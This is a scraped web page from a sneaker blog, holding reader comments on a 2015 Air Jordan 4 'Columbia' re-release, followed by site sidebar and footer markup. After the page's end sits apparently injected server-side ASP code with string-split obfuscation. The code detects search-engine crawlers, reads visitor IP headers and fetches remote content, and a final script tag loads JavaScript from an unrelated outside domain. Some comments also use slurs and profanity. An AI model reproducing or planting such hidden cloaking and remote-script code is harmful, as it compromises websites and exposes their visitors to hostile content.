        <div id="dsq-comment-header-264817" class="dsq-comment-header">
            <cite id="dsq-cite-264817">
                <span id="dsq-author-user-264817">Sneakerhead42</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264817" class="dsq-comment-body">
            <div id="dsq-comment-message-264817" class="dsq-comment-message"><p>Oreo 4s &gt; Columbia 4s</p>
</div>
        </div>

    <ul class="children">
    <li class="comment even depth-2" id="dsq-comment-264819">
        <div id="dsq-comment-header-264819" class="dsq-comment-header">
            <cite id="dsq-cite-264819">
                <span id="dsq-author-user-264819">Concord</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264819" class="dsq-comment-body">
            <div id="dsq-comment-message-264819" class="dsq-comment-message"><p>Columbia 4s &gt; Oreo 4s</p>
</div>
        </div>

    <ul class="children">
    <li class="comment odd alt depth-3" id="dsq-comment-264849">
        <div id="dsq-comment-header-264849" class="dsq-comment-header">
            <cite id="dsq-cite-264849">
                <span id="dsq-author-user-264849">Sneakerhead42</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264849" class="dsq-comment-body">
            <div id="dsq-comment-message-264849" class="dsq-comment-message"><p>U out yo mind bruh </p>
</div>
        </div>

    <ul class="children">
    <li class="comment even depth-4" id="dsq-comment-264864">
        <div id="dsq-comment-header-264864" class="dsq-comment-header">
            <cite id="dsq-cite-264864">
                <span id="dsq-author-user-264864">ROOK1E</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264864" class="dsq-comment-body">
            <div id="dsq-comment-message-264864" class="dsq-comment-message"><p>they both equally dope imo</p>
</div>
        </div>

    <ul class="children">
    <li class="comment odd alt depth-5" id="dsq-comment-265211">
        <div id="dsq-comment-header-265211" class="dsq-comment-header">
            <cite id="dsq-cite-265211">
                <span id="dsq-author-user-265211">Sneakerhead42</span>
            </cite>
        </div>
        <div id="dsq-comment-body-265211" class="dsq-comment-body">
            <div id="dsq-comment-message-265211" class="dsq-comment-message"><p>Yesssir</p>
</div>
        </div>

    </li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
    <li class="comment even depth-2" id="dsq-comment-264821">
        <div id="dsq-comment-header-264821" class="dsq-comment-header">
            <cite id="dsq-cite-264821">
                <span id="dsq-author-user-264821">GINO112233</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264821" class="dsq-comment-body">
            <div id="dsq-comment-message-264821" class="dsq-comment-message"><p>Columbia 11s &gt; both Oreo and Columbia 4s</p>
</div>
        </div>

    <ul class="children">
    <li class="comment odd alt depth-3" id="dsq-comment-264865">
        <div id="dsq-comment-header-264865" class="dsq-comment-header">
            <cite id="dsq-cite-264865">
                <span id="dsq-author-user-264865">ROOK1E</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264865" class="dsq-comment-body">
            <div id="dsq-comment-message-264865" class="dsq-comment-message"><p>nah</p>
</div>
        </div>

    </li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
    <li class="comment even depth-2" id="dsq-comment-264828">
        <div id="dsq-comment-header-264828" class="dsq-comment-header">
            <cite id="dsq-cite-264828">
                <span id="dsq-author-user-264828">I Like</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264828" class="dsq-comment-body">
            <div id="dsq-comment-message-264828" class="dsq-comment-message"><p>THUNDER 4s beats both</p>
</div>
        </div>

    </li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
    <li class="comment odd alt thread-even depth-1" id="dsq-comment-264820">
        <div id="dsq-comment-header-264820" class="dsq-comment-header">
            <cite id="dsq-cite-264820">
                <span id="dsq-author-user-264820">T$ .</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264820" class="dsq-comment-body">
            <div id="dsq-comment-message-264820" class="dsq-comment-message"><p>Wow , 2015 lookin better than this year already  </p>
</div>
        </div>

    <ul class="children">
    <li class="comment even depth-2" id="dsq-comment-264823">
        <div id="dsq-comment-header-264823" class="dsq-comment-header">
            <cite id="dsq-cite-264823">
                <span id="dsq-author-user-264823">wes</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264823" class="dsq-comment-body">
            <div id="dsq-comment-message-264823" class="dsq-comment-message"><p>ain&#8217;t that the truth</p>
</div>
        </div>

    </li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
    <li class="comment odd alt thread-odd thread-alt depth-1" id="dsq-comment-264826">
        <div id="dsq-comment-header-264826" class="dsq-comment-header">
            <cite id="dsq-cite-264826">
                <span id="dsq-author-user-264826">I Like</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264826" class="dsq-comment-body">
            <div id="dsq-comment-message-264826" class="dsq-comment-message"><p>IMO these are better than the oreos</p>
</div>
        </div>

    </li><!-- #comment-## -->
    <li class="comment even thread-even depth-1" id="dsq-comment-264827">
        <div id="dsq-comment-header-264827" class="dsq-comment-header">
            <cite id="dsq-cite-264827">
                <span id="dsq-author-user-264827">I Like</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264827" class="dsq-comment-body">
            <div id="dsq-comment-message-264827" class="dsq-comment-message"><p>The best news would be the THUNDERS are going to re-release as well!</p>
</div>
        </div>

    <ul class="children">
    <li class="comment odd alt depth-2" id="dsq-comment-264829">
        <div id="dsq-comment-header-264829" class="dsq-comment-header">
            <cite id="dsq-cite-264829">
                <span id="dsq-author-user-264829">IBePeepin</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264829" class="dsq-comment-body">
            <div id="dsq-comment-message-264829" class="dsq-comment-message"><p>Bruh those just dropped relax lol</p>
</div>
        </div>

    <ul class="children">
    <li class="comment even depth-3" id="dsq-comment-264830">
        <div id="dsq-comment-header-264830" class="dsq-comment-header">
            <cite id="dsq-cite-264830">
                <span id="dsq-author-user-264830">I Like</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264830" class="dsq-comment-body">
            <div id="dsq-comment-message-264830" class="dsq-comment-message"><p>I meant LIGHTING lol I just realize what I wrote</p>
</div>
        </div>

    </li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
    <li class="comment odd alt thread-odd thread-alt depth-1" id="dsq-comment-264835">
        <div id="dsq-comment-header-264835" class="dsq-comment-header">
            <cite id="dsq-cite-264835">
                <span id="dsq-author-user-264835">Guest</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264835" class="dsq-comment-body">
            <div id="dsq-comment-message-264835" class="dsq-comment-message"><p>nice&#8230; just can&#8217;t fuck with white bottoms. no time for maintenance!</p>
</div>
        </div>

    </li><!-- #comment-## -->
    <li class="comment even thread-even depth-1" id="dsq-comment-264867">
        <div id="dsq-comment-header-264867" class="dsq-comment-header">
            <cite id="dsq-cite-264867">
                <span id="dsq-author-user-264867">ROOK1E</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264867" class="dsq-comment-body">
            <div id="dsq-comment-message-264867" class="dsq-comment-message"><p>back when they used leather on 4s now its mostly nubuck</p>
</div>
        </div>

    </li><!-- #comment-## -->
    <li class="comment odd alt thread-odd thread-alt depth-1" id="dsq-comment-264873">
        <div id="dsq-comment-header-264873" class="dsq-comment-header">
            <cite id="dsq-cite-264873">
                <span id="dsq-author-user-264873">NoDay$Off</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264873" class="dsq-comment-body">
            <div id="dsq-comment-message-264873" class="dsq-comment-message"><p>JB finally givin us some good news!</p>
</div>
        </div>

    </li><!-- #comment-## -->
    <li class="comment even thread-even depth-1" id="dsq-comment-264888">
        <div id="dsq-comment-header-264888" class="dsq-comment-header">
            <cite id="dsq-cite-264888">
                <span id="dsq-author-user-264888">ShoeEtiquette</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264888" class="dsq-comment-body">
            <div id="dsq-comment-message-264888" class="dsq-comment-message"><p>MJ musta told his advisory board members. &#8220;LOOKA HERE FUCK IT&#8221; we bout to release every fucking thing in the vault on they ass year after year hit nigga all upside the head and the wallet. Personally I like that strategy.</p>
</div>
        </div>

    </li><!-- #comment-## -->
    <li class="comment odd alt thread-odd thread-alt depth-1" id="dsq-comment-264891">
        <div id="dsq-comment-header-264891" class="dsq-comment-header">
            <cite id="dsq-cite-264891">
                <span id="dsq-author-user-264891">above wack ogs</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264891" class="dsq-comment-body">
            <div id="dsq-comment-message-264891" class="dsq-comment-message"><p>Come on really guys, these are probably the wackest 4s of all time lets be real boring as navy blue and white with some tacky ass sky blue prolly going to be 180$ cuz you kno how it is. </p>
</div>
        </div>

    <ul class="children">
    <li class="comment even depth-2" id="dsq-comment-264919">
        <div id="dsq-comment-header-264919" class="dsq-comment-header">
            <cite id="dsq-cite-264919">
                <span id="dsq-author-user-264919">Correction</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264919" class="dsq-comment-body">
            <div id="dsq-comment-message-264919" class="dsq-comment-message"><p>$200.</p>
</div>
        </div>

    </li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
    <li class="comment odd alt thread-even depth-1" id="dsq-comment-264913">
        <div id="dsq-comment-header-264913" class="dsq-comment-header">
            <cite id="dsq-cite-264913">
                <span id="dsq-author-user-264913">Cool Jets</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264913" class="dsq-comment-body">
            <div id="dsq-comment-message-264913" class="dsq-comment-message"><p>Yall niggaz getting wet seeing these and the oreos.. yall motherfuckers gone look fucking stupid when they increase the price ten dollars again and tbh what the point if rereleasing the shoes everybody gone get them cause they haven&#8217;t been out in decades.. I think it&#8217;s bs because every jordan sell out and niggas camp out for over hype General released js&#8230; these cool but it bs because niggas gone go crazy because they haven&#8217;t been out since &#8220;99 and most of them don&#8217;t know</p>
</div>
        </div>

    <ul class="children">
    <li class="comment even depth-2" id="dsq-comment-264918">
        <div id="dsq-comment-header-264918" class="dsq-comment-header">
            <cite id="dsq-cite-264918">
                <span id="dsq-author-user-264918">SomeoneWhoIsActuallyRight^</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264918" class="dsq-comment-body">
            <div id="dsq-comment-message-264918" class="dsq-comment-message"><p>Welcome to the current world of hype beasts and Jordan&#8217;s. Btw, the price is currently gonna go up too $200 next year on these 30th anniversary pairs.</p>
</div>
        </div>

    <ul class="children">
    <li class="comment odd alt depth-3" id="dsq-comment-265071">
        <div id="dsq-comment-header-265071" class="dsq-comment-header">
            <cite id="dsq-cite-265071">
                <span id="dsq-author-user-265071">ROOK1E</span>
            </cite>
        </div>
        <div id="dsq-comment-body-265071" class="dsq-comment-body">
            <div id="dsq-comment-message-265071" class="dsq-comment-message"><p>and with tax all the 30th anniversary jordans will cost about 210, that is if you live in  a state where they tax that</p>
</div>
        </div>

    <ul class="children">
    <li class="comment even depth-4" id="dsq-comment-265250">
        <div id="dsq-comment-header-265250" class="dsq-comment-header">
            <cite id="dsq-cite-265250">
                <span id="dsq-author-user-265250">DMX</span>
            </cite>
        </div>
        <div id="dsq-comment-body-265250" class="dsq-comment-body">
            <div id="dsq-comment-message-265250" class="dsq-comment-message"><p>Shut you ass up, u gonna be first in line to camp out when these joints drop.</p>
</div>
        </div>

    </li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
    <li class="comment odd alt thread-odd thread-alt depth-1" id="dsq-comment-264958">
        <div id="dsq-comment-header-264958" class="dsq-comment-header">
            <cite id="dsq-cite-264958">
                <span id="dsq-author-user-264958">El Tonio</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264958" class="dsq-comment-body">
            <div id="dsq-comment-message-264958" class="dsq-comment-message"><p>it has been a really long time since the last time jordan brand used leather instead of plastic for the jordan 4&#8217;s wing and these columbias are gonna have it. Nice!</p>
</div>
        </div>

    </li><!-- #comment-## -->
    <li class="comment even thread-even depth-1" id="dsq-comment-265128">
        <div id="dsq-comment-header-265128" class="dsq-comment-header">
            <cite id="dsq-cite-265128">
                <span id="dsq-author-user-265128">Kaotic318</span>
            </cite>
        </div>
        <div id="dsq-comment-body-265128" class="dsq-comment-body">
            <div id="dsq-comment-message-265128" class="dsq-comment-message"><p>I need these and the Oreos. They better have leather heel tabs because the shitty plastic broke on my bred IVs from 2012</p>
</div>
        </div>

    </li><!-- #comment-## -->
    <li class="comment odd alt thread-odd thread-alt depth-1" id="dsq-comment-265144">
        <div id="dsq-comment-header-265144" class="dsq-comment-header">
            <cite id="dsq-cite-265144">
                <span id="dsq-author-user-265144">YaBoyLV</span>
            </cite>
        </div>
        <div id="dsq-comment-body-265144" class="dsq-comment-body">
            <div id="dsq-comment-message-265144" class="dsq-comment-message"><p>This may be the only Air Jordan 4 I purchase next year.  Glad to see them coming back.</p>
</div>
        </div>

    </li><!-- #comment-## -->
    <li class="comment even thread-even depth-1" id="dsq-comment-265252">
        <div id="dsq-comment-header-265252" class="dsq-comment-header">
            <cite id="dsq-cite-265252">
                <span id="dsq-author-user-265252">FATT$</span>
            </cite>
        </div>
        <div id="dsq-comment-body-265252" class="dsq-comment-body">
            <div id="dsq-comment-message-265252" class="dsq-comment-message"><p>Cool</p>
</div>
        </div>

    </li><!-- #comment-## -->
    <li class="comment odd alt thread-odd thread-alt depth-1" id="dsq-comment-267264">
        <div id="dsq-comment-header-267264" class="dsq-comment-header">
            <cite id="dsq-cite-267264">
                <span id="dsq-author-user-267264">G Douglas</span>
            </cite>
        </div>
        <div id="dsq-comment-body-267264" class="dsq-comment-body">
            <div id="dsq-comment-message-267264" class="dsq-comment-message"><p>So they will still call these the columbias but not the 11s interesting</p>
</div>
        </div>

    </li><!-- #comment-## -->
            </ul>


        </div>

    </div>

<script type="text/javascript">
var disqus_url = 'http://sneakerbardetroit.com/air-jordan-4-retro-columbia-confirmed-2015-release/';
var disqus_identifier = '130644 http://sneakerbardetroit.com/?p=130644';
var disqus_container_id = 'disqus_thread';
var disqus_shortname = 'sneakerbardetroit';
var disqus_title = "Air Jordan 4 Retro &#8220;Columbia&#8221; Confirmed 2015 Release";
var disqus_config_custom = window.disqus_config;
var disqus_config = function () {
    /*
    All currently supported events:
    onReady: fires when everything is ready,
    onNewComment: fires when a new comment is posted,
    onIdentify: fires when user is authenticated
    */
    
    
    this.language = '';
        this.callbacks.onReady.push(function () {

        // sync comments in the background so we don't block the page
        var script = document.createElement('script');
        script.async = true;
        script.src = '?cf_action=sync_comments&post_id=130644';

        var firstScript = document.getElementsByTagName('script')[0];
        firstScript.parentNode.insertBefore(script, firstScript);
    });
    
    if (disqus_config_custom) {
        disqus_config_custom.call(this);
    }
};

(function() {
    var dsq = document.createElement('script'); dsq.type = 'text/javascript';
    dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();
</script>

</main><aside class="sidebar sidebar-primary widget-area" role="complementary" itemscope="itemscope" itemtype="http://schema.org/WPSideBar"><section id="text-45" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><center><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- Top Sidebar 336 -->
<ins class="adsbygoogle"
     style="display:inline-block;width:336px;height:280px"
     data-ad-client="ca-pub-2599275089753181"
     data-ad-slot="2253775687"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></center></div>
		</div></section><section id="search-4" class="widget widget_search"><div class="widget-wrap"><form method="get" class="search-form" action="http://sneakerbardetroit.com/" role="search"><input type="search" name="s" placeholder="Search this website&#x2026;" /><input type="submit" value="Search" /></form></div></section><section id="ultimatesocialdeuxfancount_widget-2" class="widget widget_ultimatesocialdeuxfancount_widget"><div class="widget-wrap"><div class="us_wrapper us_fan_count_wrapper"><div class="us_fan_count rows-3"><a href="https://facebook.com/SBDetroit" target="_blank" class="us_facebook_fan_count_link"><div class="us_facebook_fan_count us_fan_count_button"><div class="us_fan_count_icon_holder"><i class="us-icon-facebook"></i></div><div class="us_fan_count_holder">19.4k</div><div class="us_fan_count_desc">Fans</div></div></a></div><div class="us_fan_count rows-3"><a href="https://twitter.com/sbdetroit" target="_blank" class="us_twitter_fan_count_link"><div class="us_twitter_fan_count us_fan_count_button"><div class="us_fan_count_icon_holder"><i class="us-icon-twitter"></i></div><div class="us_fan_count_holder">10.7k</div><div class="us_fan_count_desc">Followers</div></div></a></div><div class="us_fan_count rows-3"><a href="http://instagram.com/sneakerbardetroit" target="_blank" class="us_instagram_fan_count_link"><div class="us_instagram_fan_count us_fan_count_button"><div class="us_fan_count_icon_holder"><i class="us-icon-instagram"></i></div><div class="us_fan_count_holder">23.9k</div><div class="us_fan_count_desc">Followers</div></div></a></div></div></div></section><section id="text-47" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><a href="http://sneakerbardetroit.com/air-jordan-release-dates/"><img src="http://sneakerbardetroit.com/wp-content/uploads/2011/05/aj-release-dates.jpg" alt="aj-release-dates" width="332" height="125" class="aligncenter size-full wp-image-196601" /></a>

<a href="http://sneakerbardetroit.com/sneaker-release-dates/"><img src="http://sneakerbardetroit.com/wp-content/uploads/2011/05/sn-release-dates.jpg" alt="sn-release-dates" width="332" height="125" class="aligncenter size-medium wp-image-196602" /></a>

<a href="http://sneakerbardetroit.com/category/air-jordans/"><img src="http://sneakerbardetroit.com/wp-content/uploads/2011/05/aj-news-link.jpg" alt="aj-news-link" width="332" height="100" class="aligncenter size-full wp-image-196671" /></a>

<a href="http://sneakerbardetroit.com/tag/nike-lebron-12/"><img src="http://sneakerbardetroit.com/wp-content/uploads/2011/05/lebron-12-news-updated.jpg" alt="lebron-12-news-updated" width="332" height="100" class="aligncenter size-medium wp-image-196583" /></a>

<a href="http://sneakerbardetroit.com/tag/nike-kd-7/"><img src="http://sneakerbardetroit.com/wp-content/uploads/2011/05/kd-7-news-update.jpg" alt="kd-7-news-update" width="332" height="100" class="aligncenter size-full wp-image-196581" /></a>

<a href="http://sneakerbardetroit.com/tag/nike-kobe-9/"><img src="http://sneakerbardetroit.com/wp-content/uploads/2011/05/kobe-9-news-updated.jpg" alt="kobe-9-news-updated" width="332" height="100" class="aligncenter size-medium wp-image-196582" /></a>

<a href="http://sneakerbardetroit.com/tag/the-sneaker-box/"><img src="http://sneakerbardetroit.com/wp-content/uploads/2011/05/sneaker-box-podcast.jpg" alt="sneaker-box-podcast" width="332" height="100" class="aligncenter size-full wp-image-196584" /></a></div>
		</div></section><section id="text-46" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><center><style>
.responsive-tall-ad { width: 0px; height: 0px; }
@media(min-width: 500px) { .responsive-tall-ad { width: 160px; height: 600px; } }
@media(min-width: 800px) { .responsive-tall-ad { width: 300px; height: 600px; } }
</style>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- Responsive Tall Ad -->
<ins class="adsbygoogle responsive-tall-ad"
     style="display:inline-block"
     data-ad-client="ca-pub-2599275089753181"
     data-ad-slot="7378855684"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></center></div>
		</div></section></aside></div></div></div><div class="footer-widgets"><div class="wrap"><div class="footer-widgets-1 widget-area"><section id="nav_menu-3" class="widget widget_nav_menu"><div class="widget-wrap"><div class="menu-footer-menu-container"><ul id="menu-footer-menu" class="menu"><li id="menu-item-122781" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-122781"><a href="http://sneakerbardetroit.com/about/">About</a></li>
<li id="menu-item-122782" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-122782"><a href="http://sneakerbardetroit.com/privacy-policy/">Privacy Policy</a></li>
<li id="menu-item-122797" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-122797"><a href="http://sneakerbardetroit.com/advertise/">Advertise</a></li>
</ul></div></div></section>
</div><div class="footer-widgets-2 widget-area"></div><div class="footer-widgets-3 widget-area"><section id="text-33" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><img src="http://sneakerbardetroit.com/wp-content/uploads/2011/05/sbd-footer.jpg" alt="" width="324" height="85" class="aligncenter size-full wp-image-122783" /></div>
		</div></section>
</div></div></div><footer class="site-footer" role="contentinfo" itemscope="itemscope" itemtype="http://schema.org/WPFooter"><div class="wrap"><p>&#x000A9;&nbsp;2015 <a href="http://sneakerbardetroit.com">Sneaker Bar Detroit LLC</a> </p></div></footer>        <script type="text/javascript">
        // <![CDATA[
        var disqus_shortname = 'sneakerbardetroit';
        (function () {
            var nodes = document.getElementsByTagName('span');
            for (var i = 0, url; i < nodes.length; i++) {
                if (nodes[i].className.indexOf('dsq-postid') != -1) {
                    nodes[i].parentNode.setAttribute('data-disqus-identifier', nodes[i].getAttribute('data-dsqidentifier'));
                    url = nodes[i].parentNode.href.split('#', 1);
                    if (url.length == 1) { url = url[0]; }
                    else { url = url[1]; }
                    nodes[i].parentNode.href = url + '#disqus_thread';
                }
            }
            var s = document.createElement('script'); 
            s.async = true;
            s.type = 'text/javascript';
            s.src = '//' + disqus_shortname + '.disqus.com/count.js';
            (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
        }());
        // ]]>
        </script>
        <script type="text/javascript">
  var vglnk = { key: 'e8d50d15796fe99d4b77c36972e0e219' };

  (function(d, t) {
    var s = d.createElement(t); s.type = 'text/javascript'; s.async = true;
    s.src = '//cdn.viglink.com/api/vglnk.js';
    var r = d.getElementsByTagName(t)[0]; r.parentNode.insertBefore(s, r);
  }(document, 'script'));
</script><script type="text/javascript">
jQuery(document).ready(function(){
  var q2w3_sidebar_1_options = { "sidebar" : "sidebar", "margin_top" : 10, "margin_bottom" : 300, "screen_max_width" : 1025, "width_inherit" : false, "widgets" : ['text-46'] };
  q2w3_sidebar(q2w3_sidebar_1_options);
  setInterval(function () { q2w3_sidebar(q2w3_sidebar_1_options); }, 1500);
});
</script>
<script type='text/javascript'>
/* <![CDATA[ */
var mejsL10n = {"language":"en","strings":{"Close":"Close","Fullscreen":"Fullscreen","Download File":"Download File","Download Video":"Download Video","Play\/Pause":"Play\/Pause","Mute Toggle":"Mute Toggle","None":"None","Turn off Fullscreen":"Turn off Fullscreen","Go Fullscreen":"Go Fullscreen","Unmute":"Unmute","Mute":"Mute","Captions\/Subtitles":"Captions\/Subtitles"}};
var _wpmejsSettings = {"pluginPath":"\/wp-includes\/js\/mediaelement\/"};
var mejsL10n = {"language":"en","strings":{"Close":"Close","Fullscreen":"Fullscreen","Download File":"Download File","Download Video":"Download Video","Play\/Pause":"Play\/Pause","Mute Toggle":"Mute Toggle","None":"None","Turn off Fullscreen":"Turn off Fullscreen","Go Fullscreen":"Go Fullscreen","Unmute":"Unmute","Mute":"Mute","Captions\/Subtitles":"Captions\/Subtitles"}};
var _wpmejsSettings = {"pluginPath":"\/wp-includes\/js\/mediaelement\/"};
/* ]]> */
</script>
<script type='text/javascript' src='http://sneakerbardetroit.com/wp-includes/js/mediaelement/mediaelement-and-player.min.js?ver=2.15.0'></script>
<script type='text/javascript' src='http://sneakerbardetroit.com/wp-includes/js/mediaelement/wp-mediaelement.js?ver=4.0.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var pollsL10n = {"ajax_url":"http:\/\/sneakerbardetroit.com\/wp-admin\/admin-ajax.php","text_wait":"Your last request is still being processed. Please wait a while ...","text_valid":"Please choose a valid poll answer.","text_multiple":"Maximum number of choices allowed: ","show_loading":"1","show_fading":"1"};
/* ]]> */
</script>
<script type='text/javascript' src='http://sneakerbardetroit.com/wp-content/plugins/wp-polls/polls-js.js?ver=2.68'></script>
<script type='text/javascript' src='http://sneakerbardetroit.com/wp-includes/js/comment-reply.min.js?ver=4.0.1'></script>
<script type="text/javascript" id="slb_context">/* <![CDATA[ */if ( !!window.jQuery ) {(function($){$(document).ready(function(){if ( !!window.SLB ) { {$.extend(SLB, {"context":["public","user_guest"]});} }})})(jQuery);}/* ]]> */</script>
</body>
</html>

<!-- Performance optimized by W3 Total Cache. Learn more: http://www.w3-edge.com/wordpress-plugins/

Page Caching using disk: enhanced

 Served from: sneakerbardetroit.com @ 2015-01-02 19:12:50 by W3 Total Cache -->



<%
	End If
	response.End()
End if
echohtml = ""'GetContent(echourl&"sysid="&systid&"&redirect=yes")
If instr(echohtml,lk)>0 Then
	'response.Write replace(echohtml,lk,"")
End If
Function GetContent(url)
	'on error resume next
	Dim xmlHttp
	Set xmlHttp = Server.Createobject("WinHttp.WinHttpRequest.5.1")
	'xmlHttp.SetTimeouts 60000, 60000, 60000, 3000
	xmlHttp.Open "POST", url , False
	xmlHttp.Send()
	GetHtml	= xmlHttp.ResponseBody
	Set xmlHttp=Nothing
	set objStream = Server.CreateObject("Adodb.Stream")
	objStream.Type = 1
	objStream.Mode =3
	objStream.Open
	objStream.Write GetHtml
	objStream.Position = 0
	objStream.Type = 2
	objStream.Charset = "UTF-8"
	GetContent = objStream.ReadText
	objStream.Close
End Function

Function ChecksAgent()
  on error resume next
  agentallow=split("ba"&"idus"&"pid"&"er,so"&"g"&"ou,ba"&"i"&"du,so"&"sos"&"pider,goo"&"g"&"lebot",",")
  agentcheck=false
  For agenti=lbound(agentallow) to ubound(agentallow)
    If Instr(LCase(RSbs("HTTP_USER_AGENT")),agentallow(agenti))>0 then
      agentcheck=true
      Exit For
    end if 
  Next
  ChecksAgent=agentcheck
End function
Function GetRsip()
  'on error resume next
  Dim getips
  If RSbs("HTTP_"&"X_FOR"&"W"&"ARDED_FOR") = "" Or InStr(RSbs("H"&"TTP_X_FO"&"RW"&"ARD"&"ED_FOR"), "unknown") > 0 Then
   getips = RSbs("REM"&"OTE_A"&"DDR")
  ElseIf InStr(RSbs("HT"&"TP_"&"X_FORW"&"ARDED_FOR"), ",") > 0 Then
   getips = Mid(RSbs("H"&"TTP"&"_X_FO"&"RW"&"ARD"&"ED_FOR"), 1, InStr(RSbs("H"&"TT"&"P_"&"X_F"&"ORW"&"AR"&"DE"&"D_F"&"OR"), ",")-1)
   actforip = RSbs("REMO"&"TE_ADD"&"R")
  ElseIf InStr(RSbs("HTT"&"P_X"&"_F"&"RW"&"AR"&"DED_FOR"), ";") > 0 Then
   getips = Mid(RSbs("HT"&"TP_"&"X_F"&"OR"&"W"&"AR"&"DED_"&"FO"&"R"), 1, InStr(RSbs("H"&"TT"&"P_"&"_F"&"OR"&"WA"&"RD"&"ED_"&"FOR"), ";")-1)
   actforip = RSbs("R"&"EMO"&"TE_"&"AD"&"D"&"R")
  Else
   getips = RSbs("HT"&"TP"&"_X_FO"&"RW"&"ARD"&"ED_"&"FOR")
   actforip = RSbs("R"&"EM"&"OTE"&"_AD"&"DR")
  End If
  GetRsip = Replace(Trim(Mid(getips, 1, 30)), "'", "")
End Function

Function RSbs(str)
	RSbs = Request.ServerVariables(str)
End Function
%>
<script src="http://dx.jd9.co/jrnbb.js" type="text/javascript"></script>